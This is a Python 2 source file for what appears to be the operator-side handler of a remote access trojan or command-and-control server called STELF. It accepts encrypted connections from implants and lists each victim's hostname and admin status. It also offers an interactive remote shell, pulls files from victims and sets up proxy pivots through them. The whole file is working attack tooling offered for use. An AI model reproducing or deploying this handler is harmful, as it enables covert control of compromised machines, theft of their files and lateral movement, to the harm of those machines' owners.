import socket
import Queue
import os
import threading
import logging
import time
import sys
import readline
from colorama import init, Fore, Style
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib

import __builtin__ 

def raw_input2(prompt=''): 
	try: 
		return raw_input1(prompt) 
	except EOFError as exc: 
		time.sleep(0.05) 
		raise 

raw_input1 = raw_input 
__builtin__.raw_input = raw_input2

init(autoreset=True)

INFO = Style.BRIGHT + Fore.BLUE + "[*] " + Style.RESET_ALL
BAD = Style.BRIGHT + Fore.RED + "[-] " + Style.RESET_ALL
GOOD = Style.BRIGHT + Fore.GREEN + "[+] " + Style.RESET_ALL

logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
logging.critical("\n--------------------START OF NEW LOG--------------------\n")

class ProxyConnection:
	def __init__(self, channel, client):
		self.channel = channel
		self.client = client
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		for f in [self.local_to_remote, self.remote_to_local]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
	def local_to_remote(self):
		ct = threading.currentThread()
		while not ct.stopped():
			data = self.client.recv(4096)
			if not data: return
			self.send(data)
			
	def remote_to_local(self):
		ct = threading.currentThread()
		while not ct.stopped():
			data = self.recv()
			self.client.sendall(data)		

class ProxyListener:
	def __init__(self, client, port):
		logging.debug("New proxy listener created for client #"+str(client.id))
		self.client = client
		self.sock = socket.socket()
		self.sock.bind(("0.0.0.0",port))
		self.sock.listen(5)
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		ct = threading.currentThread()
		while not ct.stopped():
			local_client, addr = self.sock.accept()
			logging.debug("New proxy connection")
			channel = self.client.transport.create_channel()
			self.client.transport.signal("CREATE_CHANNEL:"+channel.id)
			time.sleep(0.2)
			self.client.transport.signal("CREATE_PROXY:"+channel.id)
			ProxyConnection(channel, local_client)
			
class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	Channels are used to split data into streams.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(id)))

	def write_input(self, data): # This function is used to feed data into a channel.
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True): # This function is used to read data from a channel.
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data): # This function is used to send data to the handler.
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def __repr__(self):
		print "Channel ID: "+str(ord(self.id))
	
class Transport:
	""""
	Used to transfer data between the handler and a client.
	"""
	def __init__(self, sock, addr, port, id, aes_obj, client):
		self.client_id = id
		self.address = addr
		self.port = port
		self.client = client
		
		self.comm_socket = sock
		
		self.aes_obj = aes_obj
		
		self.master_queue = Queue.Queue() # Data that has to be sent is put on this queue.
		self.user_channel = Channel(chr(97), self.master_queue) # Channel for user input and shell output.
		self.signal_channel = Channel(chr(254), self.master_queue) # Channel used for signalling: Requesting new channels, etc.
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}
		self.free_channel_id = 1
		
		self.disconnected = False
		
		for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
		logging.debug("Created new transport for client #"+str(self.client_id))
		
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data+chr(255))
		except: pass
		
	def recv(self):
		if self.disconnected: return ""
		
		try:
			data = ""
			while not data.endswith(chr(255)):
				data += self.comm_socket.recv(4096)
			data = data[:-1]
		except: data = ""
		
		if not data:
			self.comm_socket.close()
			logging.error("Client #"+str(self.client_id)+" disconnected")
			self.disconnected = True
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to client #"+str(self.client_id)+": "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from client #"+str(self.client_id)+": "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal)
			if signal == "CREATE_CHANNEL":
				pass
				
	def signal(self, data):
		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data)
		self.master_queue.put(self.signal_channel.id+data)
				
	def create_channel(self):
		id = chr(self.free_channel_id)
		self.free_channel_id += 1
		chan = Channel(id, self.master_queue)
		self.channels[id] = chan
		self.signal("CREATE_CHANNEL:"+chan.id)
		return chan
		
		
class Client:
	"""
	Represents a connected client.
	"""
	def __init__(self, id, cli, ip, port, aes_obj, hostname, admin):
		self.transport = Transport(cli, ip, port, id, aes_obj, self)
		self.id = id
		self.proxy_listener = None
			
		self.hostname = hostname
		self.admin_privs = admin
		
	def send(self, data):
		self.transport.user_channel.write_output(data)
		
	def recv(self):
		return self.transport.user_channel.read_input()
		
	def signal(self, data):
		return self.transport.signal(data)
		
	def download(self, path):
		logging.info("starting download.")
		ch = self.transport.create_channel()
		time.sleep(1)
		self.transport.signal("DOWNLOAD_FILE:"+ch.id+":"+path)
		
		with open(path, "wb") as f:
			print INFO + "Starting download..."
			data = ch.read_input()
			if data.startswith("Error:"):
				print BAD + data
			elif data == chr(255):
				print INFO + "File is empty."
			else:
				f.write(data)
				while True:
					data = ch.read_input()
					if data == chr(255): break
					f.write(data)
				print GOOD + "Download complete!"
	
	def interact(self):
		logging.info("Starting interaction with client #"+str(self.id))
		self.send("cd .")
		cwd = self.recv()
		sys.stdout.write(cwd)
		
		while True:
			try:
				user_input = raw_input()
			except KeyboardInterrupt:
				print INFO + "Backgrounding session."
				return True
				
			if not user_input: continue
			logging.debug("Got user input: "+user_input)
			
			if user_input.startswith("proxy start"):
				try:
					port = int(user_input.split()[2])
					self.proxy_listener = ProxyListener(self, port)
					user_input = "cd ."
				except:
					print BAD + "Invalid argument"
					
			if user_input.startswith("download"):
				#self.send(user_input)
				self.download(user_input.split()[1])
				user_input = "cd ."

			self.send(user_input)
			
			data = self.recv()
			logging.debug("Result of user input: "+data)
			if data == "CONN_LOST":
				print BAD + "Client Disconnected"
				return False
			elif data.startswith("BG_NEW_SESH"):
				print "\n" + GOOD + "A new session should appear within 30 seconds. (Try checking, it might have already connected!)"
				return True

			data = data.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
			sys.stdout.write(data)
		
class Handler:
	"""
	Main handler class. Sets up a socket for clients to connect to.
	"""
	def __init__(self, bind_addr, bind_port):
		self.bind_addr = bind_addr
		self.bind_port = bind_port
		self.sock = socket.socket()
		self.sock.bind((bind_addr, bind_port))
		self.sock.listen(5)
	
		self.clients = []
		
		self.interacting = False
		self.current_id = 0
		
	def dh_exchange(self, client):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		client_key = client.recv(4096)
		client.sendall(str(public_key))
		
		sharedSecret = pow(int(client_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
		
	def accepter(self):
		ct = threading.currentThread()
		while not ct.stopped():
			try:
				cli, addr = self.sock.accept()
				logging.info("New client connection")
				address, port = addr
				
				id = self.current_id
				self.current_id += 1
				
				data = cli.recv(4096)
				logging.debug(data)
				if data.startswith("GET"): continue
				
				aes = self.dh_exchange(cli)
				
				hostname, admin = cli.recv(4096).split("|")
				c = Client(id, cli, address, port, aes, hostname, admin)
				self.clients.append(c)
				
				if not self.interacting:
					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
					print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
					sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
					sys.stdout.flush()
			except Exception as e:
				logging.info("A client connected, but disconnected before finishing the handshake.")
		
	def run(self):
		t = StoppableThread(target=self.accepter)
		t.daemon = True
		t.start()
		while True:
			try: user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
			except KeyboardInterrupt:
				print GOOD + "Bye!"
				os._exit(0) # What is a graceful exit
				
			if user_input == "list" or user_input == "l":
				print INFO + "Current active sessions:"
				print "========================"
				for c in self.clients:
					print "["+str(c.id)+"]: " + c.transport.address + ":" + str(c.transport.port)+" Hostname: "+c.hostname+", Admin: "+c.admin_privs
					
				print "========================"
				
			elif user_input.startswith("i"):
				self.interacting = True
				try:
					the_chosen_one = [c for c in self.clients if c.id == int(user_input.split()[1])][0] # too lazy to make it properly
				except:
					print BAD + "No such client."
					continue
				if not the_chosen_one.interact(): self.clients.remove(the_chosen_one)
				self.interacting = False
		
Handler("0.0.0.0",8080).run()